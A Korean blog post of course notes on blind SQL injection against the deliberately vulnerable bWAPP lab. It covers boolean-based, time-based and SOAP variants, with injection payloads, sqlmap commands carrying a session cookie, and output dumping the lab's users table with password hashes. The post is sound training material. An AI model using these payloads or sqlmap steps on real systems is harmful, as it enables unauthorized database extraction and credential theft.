---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - Blind SQL 인젝션"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part1 A1
  - SQL 인젝션
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 10강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## Blind SQL 인젝션

* 이전에 공부한 대놓고 하는 SQL 인젝션은 웬만하면 안 된다고 함 ^^
* 대세는 Blind SQL 인젝션
* 쿼리의 결과를 참과 거짓만으로만 출력하는 페이지에 사용하는 공격
* 출력 내용이 참과 거짓밖에 없어서 데이터베이스의 내용을 추측하여 쿼리를 조작

![image](https://user-images.githubusercontent.com/28076542/52172656-7fe93880-27b7-11e9-94fb-64b4e898f497.png)

## Blind SQL 인젝션 기초 공격 구문

```bash
ascii(substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1))
```

### 사용되는 함수

* `substr(string, 시작위치, 길이)`
* `substring(string, 시작위치, 길이)`
* `length(string)`
* `right(string, length), left(string, length)`

### Bee-Box 터미널에 명령어 입력

```bash
root@bee-box:/var/www/bWAPP# mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3597
Server version: 5.0.96-0ubuntu3 (Ubuntu)

Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| bWAPP              | 
| drupageddon        | 
| mysql              | 
| testdb             | 
+--------------------+
5 rows in set (0.00 sec)

mysql> use information_schema
Database changed
mysql> select * from tables limit 0,1;
+---------------+--------------------+----------------+-------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------------+----------+----------------+---------------+
| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     | TABLE_TYPE  | ENGINE | VERSION | ROW_FORMAT | TABLE_ROWS | AVG_ROW_LENGTH | DATA_LENGTH | MAX_DATA_LENGTH | INDEX_LENGTH | DATA_FREE | AUTO_INCREMENT | CREATE_TIME | UPDATE_TIME | CHECK_TIME | TABLE_COLLATION | CHECKSUM | CREATE_OPTIONS | TABLE_COMMENT |
+---------------+--------------------+----------------+-------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------------+----------+----------------+---------------+
| NULL          | information_schema | CHARACTER_SETS | SYSTEM VIEW | MEMORY |       0 | Fixed      |       NULL |            576 |           0 |        16661376 |            0 |         0 |           NULL | NULL        | NULL        | NULL       | utf8_general_ci |     NULL | max_rows=29127 |               | 
+---------------+--------------------+----------------+-------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------------+----------+----------------+---------------+
1 row in set (0.03 sec)

mysql> select table_name from tables limit 0,1;
+----------------+
| table_name     |
+----------------+
| CHARACTER_SETS | 
+----------------+
1 row in set (0.02 sec)

mysql> select length((select table_name from tables limit 0,1));
+---------------------------------------------------+
| length((select table_name from tables limit 0,1)) |
+---------------------------------------------------+
|                                                14 | 
+---------------------------------------------------+
1 row in set (0.03 sec)

mysql> select length((select table_name from tables limit 0,1)) = 1;
+-------------------------------------------------------+
| length((select table_name from tables limit 0,1)) = 1 |
+-------------------------------------------------------+
|                                                     0 | 
+-------------------------------------------------------+
1 row in set (0.03 sec)

mysql> select length((select table_name from tables limit 0,1)) = 14;
+--------------------------------------------------------+
| length((select table_name from tables limit 0,1)) = 14 |
+--------------------------------------------------------+
|                                                      1 | 
+--------------------------------------------------------+
1 row in set (0.02 sec)

mysql> select substr((select table_name from tables limit 0,1),1,1);
+-------------------------------------------------------+
| substr((select table_name from tables limit 0,1),1,1) |
+-------------------------------------------------------+
| C                                                     | 
+-------------------------------------------------------+
1 row in set (0.03 sec)

mysql> select substr((select table_name from tables limit 0,1),2,1);
+-------------------------------------------------------+
| substr((select table_name from tables limit 0,1),2,1) |
+-------------------------------------------------------+
| H                                                     | 
+-------------------------------------------------------+
1 row in set (0.03 sec)

mysql> select substr((select table_name from tables limit 0,1),3,1);
+-------------------------------------------------------+
| substr((select table_name from tables limit 0,1),3,1) |
+-------------------------------------------------------+
| A                                                     | 
+-------------------------------------------------------+
1 row in set (0.02 sec)

mysql> select substr((select table_name from tables limit 0,1),3,1)='A';
+-----------------------------------------------------------+
| substr((select table_name from tables limit 0,1),3,1)='A' |
+-----------------------------------------------------------+
|                                                         1 | 
+-----------------------------------------------------------+
1 row in set (0.02 sec)

mysql> select ascii(substr((select table_name from tables limit 0,1),3,1))=65;
+-----------------------------------------------------------------+
| ascii(substr((select table_name from tables limit 0,1),3,1))=65 |
+-----------------------------------------------------------------+
|                                                               1 | 
+-----------------------------------------------------------------+
1 row in set (0.03 sec)
```

* 이런 작업은 수작업으로 불가능하기 때문에 프로그래밍을 통해 자동화를 해야 함

## SQL Injection - Blind - Boolean-Based

![image](https://user-images.githubusercontent.com/28076542/52172825-c12f1780-27ba-11e9-81e3-40c4ab244541.png)

* 테이블에 자료가 있느냐 없느냐만을 출력해주는 창이 존재

```bash
mysql> select * from movies;
+----+--------------------------+--------------+--------+-----------------+-----------+---------------+
| id | title                    | release_year | genre  | main_character  | imdb      | tickets_stock |
+----+--------------------------+--------------+--------+-----------------+-----------+---------------+
|  1 | G.I. Joe: Retaliation    | 2013         | action | Cobra Commander | tt1583421 |           100 | 
|  2 | Iron Man                 | 2008         | action | Tony Stark      | tt0371746 |            53 | 
|  3 | Man of Steel             | 2013         | action | Clark Kent      | tt0770828 |            78 | 
|  4 | Terminator Salvation     | 2009         | sci-fi | John Connor     | tt0438488 |           100 | 
|  5 | The Amazing Spider-Man   | 2012         | action | Peter Parker    | tt0948470 |            13 | 
|  6 | The Cabin in the Woods   | 2011         | horror | Some zombies    | tt1259521 |           666 | 
|  7 | The Dark Knight Rises    | 2012         | action | Bruce Wayne     | tt1345836 |             3 | 
|  8 | The Fast and the Furious | 2001         | action | Brian O'Connor  | tt0232500 |            40 | 
|  9 | The Incredible Hulk      | 2008         | action | Bruce Banner    | tt0800080 |            23 | 
| 10 | World War Z              | 2013         | horror | Gerry Lane      | tt0816711 |             0 | 
+----+--------------------------+--------------+--------+-----------------+-----------+---------------+
10 rows in set (0.00 sec)
```

* 아이디가 1번(G.I. Joe: Retailation)인데 다음 명령을 통해 아이디가 1번이고 첫 번쨰 글짜가 G인 것을 확인
* `' or id=1 and substr(title,1,1)="G" #`

![image](https://user-images.githubusercontent.com/28076542/52172855-719d1b80-27bb-11e9-9985-6da869b8d367.png)

* 영화가 존재한다고 뜸
* 이런 식의 테스트는 시간이 너무 오래 걸려 스크립트 혹은 SQLMAP 이용
* 강의에서는 SQLMAP이 되지 않는다고 하여 따로 찾아봄 [링크](http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/)

### SQLMAP 사용

1. 파이어폭스 쿠키매니저 설치 후 쿠키 값 알아오기

* [쿠키매니저](https://addons.mozilla.org/en-US/firefox/addon/a-cookie-manager/)

![image](https://user-images.githubusercontent.com/28076542/52172930-487d8a80-27bd-11e9-852d-7a1e2670713d.png)

2. 데이터베이스 이름 알아오기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0" --dbs --level=3 --risk=3
```

* 긴 시간이 지나면...

```bash
available databases [5]:
[*] bWAPP
[*] drupageddon
[*] information_schema
[*] mysql
[*] testdb

[18:04:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.190.143'

[*] shutting down at 18:04:32
```

* 데이터베이스 이름들을 알아오는데 성공하였으니 테이블을 알아오기

3. 데이터베이스 테이블 알아오기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0"  -D bWAPP --tables
       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.1.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:11:00

[18:11:00] [INFO] resuming back-end DBMS 'mysql' 
[18:11:00] [INFO] testing connection to the target URL
[18:11:00] [WARNING] potential CAPTCHA protection mechanism detected
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: title=test' OR NOT 5748=5748-- XIlf&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=test' AND (SELECT * FROM (SELECT(SLEEP(5)))XKkh)-- ASfU&action=search
---
[18:11:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 5.0.12
[18:11:00] [INFO] fetching tables for database: 'bWAPP'
[18:11:00] [INFO] fetching number of tables for database 'bWAPP'
[18:11:00] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:11:00] [INFO] retrieved: 5
[18:11:00] [INFO] retrieved: blog
[18:11:01] [INFO] retrieved: heroes
[18:11:02] [INFO] retrieved: movies
[18:11:02] [INFO] retrieved: users
[18:11:03] [INFO] retrieved: visitors
Database: bWAPP
[5 tables]
+----------+
| blog     |
| heroes   |
| movies   |
| users    |
| visitors |
+----------+

[18:11:04] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.190.143'

[*] shutting down at 18:11:04
```

* 테이블 이름들을 알았으니 이제 column들을 추출해야함

4. users columns를 추출하기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0"  -D bWAPP -T users --columns
```

```bash
Database: bWAPP
Table: users
[9 columns]
+-----------------+--------------+
| Column          | Type         |
+-----------------+--------------+
| activated       | tinyint(1)   |
| activation_code | varchar(100) |
| admin           | tinyint(1)   |
| email           | varchar(100) |
| id              | int(10)      |
| login           | varchar(100) |
| password        | varchar(100) |
| reset_code      | varchar(100) |
| secret          | varchar(100) |
+-----------------+--------------+

[18:14:09] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.190.143'

[*] shutting down at 18:14:09
```

* column들의 이름들을 알았으니 email, login, password, secret들의 column 정보들을 dump해야 함

5. column이 갖고 있는 정보 dump 하기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0" -D bWAPP -T users -C email,login,password,secret --dump
```

```bash
Database: bWAPP
Table: users
[2 entries]
+--------------------------+--------+------------------------------------------+-------------------------------------+
| email                    | login  | password                                 | secret                              |
+--------------------------+--------+------------------------------------------+-------------------------------------+
| bwapp-aim@mailinator.com | A.I.M. | 6885858486f31043e5839c735d99457f045affd0 | A.I.M. or Authentication Is Missing |
| bwapp-bee@mailinator.com | bee    | 6885858486f31043e5839c735d99457f045affd0 | Any bugs?                           |
+--------------------------+--------+------------------------------------------+-------------------------------------+

[18:16:39] [INFO] table 'bWAPP.users' dumped to CSV file '/root/.sqlmap/output/192.168.190.143/dump/bWAPP/users.csv'
[18:16:39] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.190.143'

[*] shutting down at 18:16:39
```

## SQL Injection - Blind - Time-Based

![image](https://user-images.githubusercontent.com/28076542/52174834-4fb49080-27dd-11e9-8662-53b06f7f09b4.png)

* `'or 1=1 #`이나 `'or 1=2 #`이나 똑같은 결과를 보여줌
* `'or id=1 and substr(title,1,1)="G" and sleep(1) #`는 참이여서 시간이 걸림
* `'or id=1 and substr(title,1,1)="I" and sleep(1) #`는 거짓이여서 바로 결과가 반환됨

### SQLMAP으로 Time-Based 조작해보기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_15.php?title=aaaaa&action=search" -p title --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0" --banner --technique=T --level=2
```

* -p: 취약한 파라미터를 지정하는 옵션으로 title로 지정함

```bash
.96-0ubuntu3
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner:    '5.0.96-0ubuntu3'
[18:43:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.190.143'

[*] shutting down at 18:43:08
```

## SQL Injection - Blind (WS/SOAP)

![image](https://user-images.githubusercontent.com/28076542/52174927-79ba8280-27de-11e9-8155-aece213f2524.png)

* SOAP: 서비스를 제공하는 방식인데 자세한 내용은 책 참고하래
* SOAP은 URL에 주석 처리를 해도 주석 처리가 안 됨

```php
<?php
if(isset($_REQUEST["title"]))
{   
    // Includes the NuSOAP library
    require_once("soap/nusoap.php");

    // Creates an instance of the soap_client class
    $client = new nusoap_client("http://localhost/bWAPP/ws_soap.php");

    // Calls the SOAP function
    $tickets_stock = $client->call("get_tickets_stock", array("title" => sqli($_REQUEST["title"])));

    echo "We have <b>" . $tickets_stock . "</b> movie tickets available in our stock.";
}
?>
```

* ws_soap.php에는 다음과 같은 코드가 있음

```php
// SOAP function
function get_tickets_stock($title)
{

	include("connect.php");        
	$sql = "SELECT tickets_stock FROM movies WHERE title = '" . $title . "'";
	$recordset = mysql_query($sql, $link);
        $row = mysql_fetch_array($recordset);
        mysql_close($link);
	return $row["tickets_stock"];

}
```

* 아무튼 안 됨
* `1=1 #`과 같은 주석처리가 먹히지 않으므로 `title=aaaaa' or 'a'='a`로 작은 따옴표가 잘 닫히도록 조작 가능
* `192.168.190.143/bWAPP/sqli_5.php?title=aaaaa' or 'a'='a&action=go`

![image](https://user-images.githubusercontent.com/28076542/52175098-cb184100-27e1-11e9-8062-7f8dbe4a2e79.png)

* 무조건 참인 값을 출력한 것으로 만약 * `192.168.190.143/bWAPP/sqli_5.php?title=aaaaa' or 'a'='b&action=go`를 입력하면 남은 티켓 개수가 뜨지 않음

![image](https://user-images.githubusercontent.com/28076542/52175112-fa2eb280-27e1-11e9-8c9e-4fa760edc27e.png)